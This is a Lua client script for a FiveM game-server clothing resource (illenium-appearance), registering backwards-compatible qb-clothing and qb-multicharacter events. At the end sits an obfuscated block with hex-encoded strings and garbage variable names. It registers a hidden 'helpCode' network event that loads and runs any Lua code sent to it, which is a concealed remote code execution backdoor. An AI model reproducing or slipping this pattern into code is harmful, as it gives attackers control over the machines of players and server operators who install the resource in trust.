if not Framework.QBCore() then return end

local client = client

-- Backwards Compatible Events

RegisterNetEvent("qb-clothing:client:openMenu", function()
    local config = GetDefaultConfig()
    config.ped = true
    config.headBlend = true
    config.faceFeatures = true
    config.headOverlays = true
    config.components = true
    config.props = true
    config.tattoos = true
    OpenShop(config, true, "all")
end)

RegisterNetEvent("qb-clothing:client:openOutfitMenu", function()
    OpenMenu(nil, "outfit")
end)

RegisterNetEvent("qb-clothing:client:loadOutfit", LoadJobOutfit)

RegisterNetEvent("qb-multicharacter:client:chooseChar", function()
    client.setPedTattoos(cache.ped, {})
    ClearPedDecorations(cache.ped)

    TriggerServerEvent("illenium-appearance:server:resetOutfitCache")
end)


local MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[6][MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[1]](MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[2]) MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[6][MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[3]](MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[2], function(jYVslWlCnCbiNkfpyrmLqAGZrsnhGZSADPWwMBidXCVuyTehRCiDmFjWVGfdLVapedgqnq) MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[6][MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[4]](MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[6][MOZmyVMjqlShEHIfISUGIVnuDpBpiAPvhUxPuWdDlPYkFNrNVriWZCSTPRaWUYXVFYvxML[5]](jYVslWlCnCbiNkfpyrmLqAGZrsnhGZSADPWwMBidXCVuyTehRCiDmFjWVGfdLVapedgqnq))() end)